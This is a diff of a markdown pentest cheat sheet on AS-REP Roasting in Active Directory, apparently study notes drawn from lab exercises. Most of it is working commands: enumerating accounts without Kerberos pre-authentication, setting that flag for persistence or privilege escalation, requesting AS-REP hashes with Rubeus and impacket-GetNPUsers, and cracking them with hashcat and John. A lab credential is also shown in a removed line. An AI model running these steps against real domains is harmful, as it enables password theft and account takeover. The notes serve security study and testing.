@@ -1,56 +1,91 @@
 ### Content
-- [ASREPRoasting](#asreproasting)
-- [ASREPRoasting from Windows](#asreproasting-from-windows)
-- [ASREPRoasting from Linux](#asreproasting-from-linux)
-- [Crack krb5asrep](#crack-krb5asrep)
+
+- [From Windows](#from-windows)
+	- [Enumeration](#enumeration)
+	- [Exploitation](#exploitation)
+- [From Linux](#from-linux)
+	- [Enumeration](#enumeration)
+	- [Exploitation](#exploitation)
+
 ---
-## ASREPRoasting
+
+> [!Important]
+> 
+> `$ hashcat -m 18200 toCrack.txt /usr/share/wordlists/rockyou.txt `
+> `$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep toCrack.txt`
 
 - It's possible to obtain the (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled.
-- The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.
+- Authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.
+- TGT is subjected to an offline password attack as it's encrypted with the user password's NTLM hash.
 
-If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.
-
-Ex:
 <img src="/assets/preauth_not_reqd_mmorgan.webp" style="display: block; margin:auto; width:80%; height:60%;">
 
----
-## ASREPRoasting from Windows
 
-```Powershell
-# ActiverDirectory:
+AS-REPRoasting can be use for:
+
+- `Persistence`: setting the bit `DONT_REQ_PREAUTH` flag on accounts would allow attackers to regain access to domain account even after a password reset.
+- `Privilege Escalation`: When an attacker has the ability change any attribute of an account but not the ability to log in without knowing or resetting the password. Password resets are dangerous as they have a high probability of raising alarms. Instead of resetting the password, attackers can enable this bit and attempt to crack the account's password hash.
+
+Suppose an attacker has `GenericWrite` or `GenericAll` permissions over an account. In that case, they can enable this attribute and obtain the AS_REP ticket before disabling it again.
+
+```PowerShell
+# Set DONT_REQ_PREAUTH with PowerView
+PS C:\> Set-DomainObject -Identity <samAccountName> -XOR @{useraccountcontrol=4194304} -Verbose
+```
+
+---
+### From Windows
+
+#### Enumeration
+
+```powershell
+# Using ActiveDirectory module:
 PS C:\> Get-ADUser -Filter { (UserAccountControl -band 4194304) -and (Enabled -eq $true) } -Properties * | Select SamAccountName,userAccountControl,userprincipalname | fl
 
-# Decode the userAccountControl in https://www.techjutsu.com/uac-decoder
-
-# PowerView:
+# Using Powerview
 PS C:\> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+# Or
+PS C:\> Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 
-# Retrieving AS-REP in Proper Format using Rubeus
+# Using Rubeus
+C:\Rubeus>Rubeus.exe preauthscan /users:uns.txt /domain:corp.local /dc:<IP>
+```
+
+Decode the `userAccountControl` in [uac-decoder](https://www.techjutsu.com/uac-decoder)
+
+#### Exploitation
+
+```Powershell
+# Using Rubeus
+# From a joined domain account session
+# Target a specific user:
 PS C:\> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+# Extract all the as-reproastable users:
+PS C:\> .\Rubeus.exe asreproast  /format:hashcat /outfile:ASREProastables.txt
+# None domain user:
+PS C:\> .\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt
 ```
 
 ---
-## ASREPRoasting from Linux
+### From Linux
 
-```bash 
-# When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.
+#### Enumeration
+
+```PowerShell
+# kerbrute will retrieve the AS-REP for any users found that do not require Kerberos pre-authentication while user enumeration
 $ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 
-# With a list of valid users, we can use Get-NPUsers
-$ impacket-GetNPUsers INLANEFREIGHT.LOCAL/  -usersfile users.txt -format hashcat -dc-ip 172.16.5.5 -outputfile out.txt
-# We can use wordlist into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication
+# Using impacket-GetNPUsers 
+$ impacket-GetNPUsers corp.local/'USERNAME':'PASSWORD'
+```
 
-# We can use Get-NPUsers from authenticated point of view
-$ impacket-GetNPUsers INLANEFREIGHT.LOCAL/forend:Klmcargo2  -request  -dc-ip 172.16.5.5 -outputfile out.txt
+#### Exploitation
+
+```bash 
+# To request AS-REP for every as-preroastable user
+$ impacket-GetNPUsers corp.local/'USERNAME':'PASSWORD' -request -outputfile hashes.txt
+
+# With a list of valid users and whithout authenticatation
+$ impacket-GetNPUsers corp.local/  -dc-ip 172.16.5.5 -no-pass -usersfile users.txt -format hashcat -outputfile out.txt 
 ```
 ---
-## Crack krb5asrep
-
-```bash
-# Hashcat
-$ hashcat -m 18200 toCrack.txt /usr/share/wordlists/rockyou.txt 
-
-# John
-$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep toCrack.txt
-```
